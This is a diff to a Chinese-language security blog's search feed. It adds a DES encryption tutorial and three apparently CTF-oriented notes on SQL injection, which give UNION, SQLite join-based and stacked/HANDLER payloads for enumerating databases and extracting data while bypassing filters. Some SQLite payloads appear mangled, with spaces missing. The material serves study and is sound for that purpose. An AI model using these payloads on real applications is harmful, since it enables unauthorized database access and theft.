@@ -54,6 +54,31 @@
     
     
     <entry>
+      <title>DES加密详细解析</title>
+      <link href="/blog/2026/03/01/DES%E5%8A%A0%E5%AF%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"/>
+      <url>/blog/2026/03/01/DES%E5%8A%A0%E5%AF%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h1 id="DES加密详细解析"><a href="#DES加密详细解析" class="headerlink" title="DES加密详细解析"></a>DES加密详细解析</h1><p>标签（空格分隔）： DES</p><hr><h2 id="DES概述"><a href="#DES概述" class="headerlink" title="DES概述"></a>DES概述</h2><p>64位明文明文分组进行16轮完全相同的变换（轮函数）</p><p>56位有效密钥长度（外加8位奇偶校验位，总输入为64位）。</p><p>分组长度：64位</p><hr><h2 id="加密核心流程"><a href="#加密核心流程" class="headerlink" title="加密核心流程"></a>加密核心流程</h2><h2 id="整体流程如下"><a href="#整体流程如下" class="headerlink" title="整体流程如下"></a>整体流程如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    64位明文</span><br><span class="line">        |</span><br><span class="line">        ↓</span><br><span class="line">初始置换（IP）</span><br><span class="line">        |</span><br><span class="line">        ↓</span><br><span class="line">将64位分为左半（L0）、右半（R0），各32位</span><br><span class="line">        |</span><br><span class="line">        |----------------------|</span><br><span class="line">        |                      |</span><br><span class="line">        ↓ (16轮迭代)           ↓</span><br><span class="line">   L[i] = R[i-1]         R[i] = L[i-1] ⊕ F(R[i-1], K[i])</span><br><span class="line">        |                      |</span><br><span class="line">        |----------------------|</span><br><span class="line">        |         (i从1到16)</span><br><span class="line">        ↓</span><br><span class="line">16轮后，交换左右（L16, R16）→（R16, L16）</span><br><span class="line">        |</span><br><span class="line">        ↓</span><br><span class="line">末置换（IP⁻¹，即IP的逆置换）</span><br><span class="line">        |</span><br><span class="line">        ↓</span><br><span class="line">    64位密文</span><br></pre></td></tr></table></figure></h2><h3 id="首先密匙的处理"><a href="#首先密匙的处理" class="headerlink" title="首先密匙的处理"></a>首先密匙的处理</h3><p>首先提供64位的密匙（通常是8字节的密匙），在每一个字节的编码为长度为8的2进制值，而此时每个字节的第8位是奇偶检验位。</p><h4 id="对密匙进行PC-1置换"><a href="#对密匙进行PC-1置换" class="headerlink" title="对密匙进行PC-1置换"></a>对密匙进行PC-1置换</h4><p>此时在PC-1置换的过程中每个字节的第8位（奇偶检验位舍去），PC-1表是一个标准且固定的表。下面以每个字节（1-64排序去除奇偶检验位）呈现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 左半部分 C₀ 的来源位置（位的位置编号从1开始）</span><br><span class="line">57, 49, 41, 33, 25, 17,  9,</span><br><span class="line"> 1, 58, 50, 42, 34, 26, 18,</span><br><span class="line">10,  2, 59, 51, 43, 35, 27,</span><br><span class="line">19, 11,  3, 60, 52, 44, 36,</span><br><span class="line"> </span><br><span class="line">// 右半部分 D₀ 的来源位置</span><br><span class="line">63, 55, 47, 39, 31, 23, 15,</span><br><span class="line"> 7, 62, 54, 46, 38, 30, 22,</span><br><span class="line">14,  6, 61, 53, 45, 37, 29,</span><br><span class="line">21, 13,  5, 28, 20, 12,  4</span><br></pre></td></tr></table></figure><p>此时将前28个分为$C_{0}$和$D_{0}$</p><hr><h4 id="然后进行偏移生成所有的-C-n-和-D-n"><a href="#然后进行偏移生成所有的-C-n-和-D-n" class="headerlink" title="然后进行偏移生成所有的$C_{n}$和$D_{n}$"></a>然后进行偏移生成所有的$C_{n}$和$D_{n}$</h4><p>在DES的16轮加密的时候每一轮对C和D循环左移位数是预先定义好的。</p><table><thead><tr><th>轮数 (Round i)</th><th>左移位数 (Shift Amount)</th></tr></thead><tbody><tr><td>1, 2, 9, 16</td><td>1位</td></tr><tr><td>其他所有轮 (3,4,5,6,7,8,10,11,12,13,14,15)</td><td>2位</td></tr><tr><td>记忆技巧：只有第1、2、9、16轮移1位，其他都移2位。</td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">左移的情况</span><br><span class="line">原始Cᵢ： b₁ b₂ b₃ b₄ ... b₂₇ b₂₈</span><br><span class="line">左移后： b₂ b₃ b₄ ... b₂₈ b₁</span><br><span class="line">原始Cᵢ： b₁ b₂ b₃ b₄ b₅ ... b₂₇ b₂₈</span><br><span class="line">左移后： b₃ b₄ b₅ ... b₂₈ b₁ b₂</span><br></pre></td></tr></table></figure><h4 id="K-i-的生成"><a href="#K-i-的生成" class="headerlink" title="K[i]的生成"></a>K[i]的生成</h4><p>此时会通过PC-2生成K[i]，PC-2是固定的，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">14 17 11 24  1  5</span><br><span class="line"> 3 28 15  6 21 10</span><br><span class="line">23 19 12  4 26  8</span><br><span class="line">16  7 27 20 13  2</span><br><span class="line">41 52 31 37 47 55</span><br><span class="line">30 40 51 45 33 48</span><br><span class="line">44 49 39 56 34 53</span><br><span class="line">46 42 50 36 29 32</span><br></pre></td></tr></table></figure><p>现在以k[1]的生成为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C1 = 1110000110011001010101011111</span><br><span class="line">D1 = 1010101011001100111100011110</span><br><span class="line">拼接：C1||D1 = 11100001100110010101010111111010101011001100111100011110 (56位)</span><br><span class="line">通过PC-2选择48位得到：</span><br><span class="line">K[1] = 000110 110000 001011 101111 111111 000111 000001 110010</span><br><span class="line">       (二进制分组，每6位一组，方便后续S盒处理)</span><br></pre></td></tr></table></figure><p>就可以生成k[i]了。由于进行了16轮对密匙的处理，我们得到了16个子密匙。然后通常我们把密匙写成16进制可以得到以下类似的子密匙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">K[1] = 1B02EFFC7072</span><br><span class="line">K[2] = 79AED9DBC39E</span><br><span class="line">K[3] = 55FC8A42CF99</span><br><span class="line">K[4] = 72ADD3CBC955</span><br><span class="line">K[5] = 7CEDB5E2F509</span><br><span class="line">K[6] = 6B27834AF0FA</span><br><span class="line">K[7] = 5DA5DD2F4396</span><br><span class="line">K[8] = 627119730C5D</span><br><span class="line">K[9] = 5C4CF396F27C</span><br><span class="line">K[10]= 4F6ADE9F04B1</span><br><span class="line">K[11]= 2F08E7843FDA</span><br><span class="line">K[12]= 43C9FE5C9DC9</span><br><span class="line">K[13]= 6D27A3A4E8F9</span><br><span class="line">K[14]= 5B42D3ECBCD7</span><br><span class="line">K[15]= 28EF7D5B9FDA</span><br><span class="line">K[16]= 4E5A7EC3DB8F</span><br></pre></td></tr></table></figure><hr><h3 id="明文的处理"><a href="#明文的处理" class="headerlink" title="明文的处理"></a>明文的处理</h3><h4 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h4><p>先将明文利用ASCLL值换为二进制。但是由于DES加密每一次只能对8个长度的数据块进行加密。所以会将剩下的数据块进行填充。</p><p>比如剩下m长度数据块，则剩下8-m长度的数据块的值都为8-m。然后就可以填充成为一个长度为8的数据块</p><hr><h4 id="然后对明文进行初始置换IP"><a href="#然后对明文进行初始置换IP" class="headerlink" title="然后对明文进行初始置换IP"></a>然后对明文进行初始置换IP</h4><p>明文置换的IP表是一定的所以我们用原始明文顺序从1-64来表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">58 50 42 34 26 18 10 2</span><br><span class="line">60 52 44 36 28 20 12 4</span><br><span class="line">62 54 46 38 30 22 14 6</span><br><span class="line">64 56 48 40 32 24 16 8</span><br><span class="line">57 49 41 33 25 17  9 1</span><br><span class="line">59 51 43 35 27 19 11 3</span><br><span class="line">61 53 45 37 29 21 13 5</span><br><span class="line">63 55 47 39 31 23 15 7</span><br></pre></td></tr></table></figure><p>然后再分为L0和R0如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IP(M) = 11001100 00000000 11001100 11111111</span><br><span class="line">        11110000 10101010 11110000 10101010</span><br><span class="line">分为：</span><br><span class="line">L0 = 11001100 00000000 11001100 11111111  (0xCC00CCFF)</span><br><span class="line">R0 = 11110000 10101010 11110000 10101010  (0xF0AAF0AA)</span><br></pre></td></tr></table></figure><hr><h3 id="16轮Feistel迭代"><a href="#16轮Feistel迭代" class="headerlink" title="16轮Feistel迭代"></a>16轮Feistel迭代</h3><p>假设当前是第i轮（i从1到16），我们有：</p><p>输入：Lᵢ₋₁（左32位），Rᵢ₋₁（右32位）</p><p>子密钥：Kᵢ（48位，由密钥调度算法生成）</p><p>由于迭代会有些复杂我将把每一步列出来</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">复制Rᵢ₋₁（32位）作为轮函数F的输入</span><br></pre></td></tr></table></figure><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rᵢ₋₁ (32位) → [E盒扩展] → E(Rᵢ₋₁) (48位)</span><br></pre></td></tr></table></figure><p>E盒拓展:    直观规律：每组的第1位来自前一组最后1位，第6位来自后一组第1位<br>具体数值变成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入32位的位置： 1  2  3  4  5  6  7  8 ... 32</span><br><span class="line">输出48位的位置：32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, ... 31, 32, 1</span><br></pre></td></tr></table></figure><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>与子密匙异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E(Rᵢ₋₁) ⊕ Kᵢ = 48位中间结果</span><br></pre></td></tr></table></figure><h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p>将48位结果分成8个6位组，每组送入一个不同的S盒（S1-S8）</p><p>S盒的结构<br>数量： DES共有 8个不同的S盒，记为 S1, S2, …, S8。</p><p>输入： 每个S盒的输入是 6位 数据（b1 b2 b3 b4 b5 b6）。</p><p>输出： 每个S盒的输出是 4位 数据。</p><p>位置： 在F函数中，与子密钥异或后的48位数据被平均分成8组，每组6位，分别进入对应的S1到S8盒进行处理。</p><ol><li><p>S盒的工作机制（查找表方法）<br>每个S盒本质上是一个4行16列的固定查找表。6位输入如何在这个表中定位到一个4位输出，是理解S盒的关键。</p></li><li><p>查找步骤：</p><p>行列确定：</p><p>将6位输入 b1 b2 b3 b4 b5 b6 中的 首位b1和末位b6 组合成一个2位二进制数 (b1<br>b6)。这个数的十进制值决定了查找的行号（0, 1, 2, 3）。</p><p>将中间4位 b2 b3 b4 b5 组合成一个4位二进制数。这个数的十进制值决定了查找的列号（0 到 15）。</p><p>输出获取：</p><p>在对应的S盒表中，找到(行， 列)交叉位置的数字（范围是0-15，即4位二进制数）。</p><p>将此数字转换为4位二进制，即为该S盒的输出。</p></li></ol><h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><p>对S盒获取的输出进行一个P盒(32位)混淆，和IT类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">P盒</span><br><span class="line"> </span><br><span class="line">16,  7, 20, 21,</span><br><span class="line">29, 12, 28, 17,</span><br><span class="line"> 1, 15, 23, 26,</span><br><span class="line"> 5, 18, 31, 10,</span><br><span class="line"> 2,  8, 24, 14,</span><br><span class="line">32, 27,  3,  9,</span><br><span class="line">19, 13, 30,  6,</span><br><span class="line">22, 11,  4, 25</span><br></pre></td></tr></table></figure><h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><p>此时获得的$R_{i}$和$L_{i}$进行异或运算再得到一个新的$R_{i}$</p><p>最后的最后将$R_{i}$和$L_{i}$进行交换得到下一轮的$R_{i}$和$L_{i}$（第16轮就不进行交换了）</p><hr><h3 id="最终合并"><a href="#最终合并" class="headerlink" title="最终合并"></a>最终合并</h3><p>合并规则：</p><p>将最后一轮的输出按 R16 || L16 的顺序合并（即右半部分在前，左半部分在后）。</p><p>最后的最后进行末置换<br>$IP^{-1}$表如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40, 8, 48, 16, 56, 24, 64, 32,</span><br><span class="line">39, 7, 47, 15, 55, 23, 63, 31,</span><br><span class="line">38, 6, 46, 14, 54, 22, 62, 30,</span><br><span class="line">37, 5, 45, 13, 53, 21, 61, 29,</span><br><span class="line">36, 4, 44, 12, 52, 20, 60, 28,</span><br><span class="line">35, 3, 43, 11, 51, 19, 59, 27,</span><br><span class="line">34, 2, 42, 10, 50, 18, 58, 26,</span><br><span class="line">33, 1, 41,  9, 49, 17, 57, 25</span><br></pre></td></tr></table></figure><p>随后得到真正的密文</p><hr><h2 id="额外信息-S表"><a href="#额外信息-S表" class="headerlink" title="额外信息:S表"></a>额外信息:S表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">S1</span><br><span class="line"> </span><br><span class="line">14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,</span><br><span class="line">0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,</span><br><span class="line">4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,</span><br><span class="line">15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> </span><br><span class="line">S2</span><br><span class="line"> </span><br><span class="line">15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,</span><br><span class="line">3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,</span><br><span class="line">0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,</span><br><span class="line">13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> </span><br><span class="line">S3</span><br><span class="line"> </span><br><span class="line">10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,</span><br><span class="line">13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,</span><br><span class="line">13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,</span><br><span class="line">1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> </span><br><span class="line">S4</span><br><span class="line"> </span><br><span class="line">7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,</span><br><span class="line">13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,</span><br><span class="line">10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,</span><br><span class="line">3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> </span><br><span class="line">S5</span><br><span class="line"> </span><br><span class="line">2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,</span><br><span class="line">14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,</span><br><span class="line">4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,</span><br><span class="line">11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> </span><br><span class="line">S6</span><br><span class="line">12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,</span><br><span class="line">10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,</span><br><span class="line">9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,</span><br><span class="line">4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> </span><br><span class="line">S7</span><br><span class="line"> </span><br><span class="line">4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,</span><br><span class="line">13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,</span><br><span class="line">1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,</span><br><span class="line">6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> </span><br><span class="line">S8</span><br><span class="line"> </span><br><span class="line">13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,</span><br><span class="line">1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,</span><br><span class="line">7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,</span><br><span class="line">2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11</span><br></pre></td></tr></table></figure><hr><h2 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h2><p>解密与加密完全相同的算法  (从前到后的顺序一样)，只是子密钥使用顺序相反：</p><p>加密：K1, K2, …, K16</p><p>解密：K16, K15, …, K1</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Crypto </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> DES </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ECC(椭圆曲线加密)）</title>
       <link href="/blog/2026/02/25/ECC(%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86)/"/>
       <url>/blog/2026/02/25/ECC(%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86)/</url>
@@ -229,6 +254,81 @@
     
     
     <entry>
+      <title>SQL union联合注入</title>
+      <link href="/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
+      <url>/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQLite</title>
+      <link href="/blog/2026/01/28/SQLite/"/>
+      <url>/blog/2026/01/28/SQLite/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL堆叠注入</title>
+      <link href="/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+      <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL&quot;,&quot;号绕过</title>
       <link href="/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
       <url>/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</url>
@@ -271,56 +371,6 @@
         <tags>
             
             <tag> SQL绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQLite</title>
-      <link href="/blog/2026/01/28/SQLite/"/>
-      <url>/blog/2026/01/28/SQLite/</url>
-      
